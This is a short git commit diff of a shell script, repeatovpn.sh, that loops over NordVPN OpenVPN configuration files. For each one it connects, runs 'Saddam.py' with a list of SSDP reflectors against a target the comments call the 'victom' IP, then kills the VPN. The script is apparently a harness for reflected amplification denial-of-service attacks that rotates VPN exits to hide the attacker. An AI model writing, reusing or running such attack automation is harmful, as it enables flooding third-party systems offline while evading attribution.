96054884d9c1a5fb7a3e602794134761f9890043
jean <yjzheng0422@gmail.com>
2018-05-10 15:54:56 +0800

    use sigterm to kill

--- repeatovpn.sh
+++ repeatovpn.sh
@@ -1,12 +1,13 @@
 #$1 should be like uk100.nordvpn.com.udp.ovpn
 #need to set export $victom as victom ip
-#find /etc/openvpn/ovpn_udp/ -type f -exec ./repeatovpn.sh {} \;
+#sudo find /etc/openvpn/ovpn_udp/ -type f -exec sudo sh -x ./repeatovpn.sh {} \;
 current=`pwd`
 cd /etc/openvpn/ovpn_udp/
 echo "config file"
 echo $1
 openvpn $1&
-sleep 10
+sleep 5
 cd $current
 python Saddam.py `cat ssdp_selmon2.txt` -p ssdp_out.txt -t 1
-pkill openvpn
+pkill --signal SIGTERM openvpn
+sleep 1
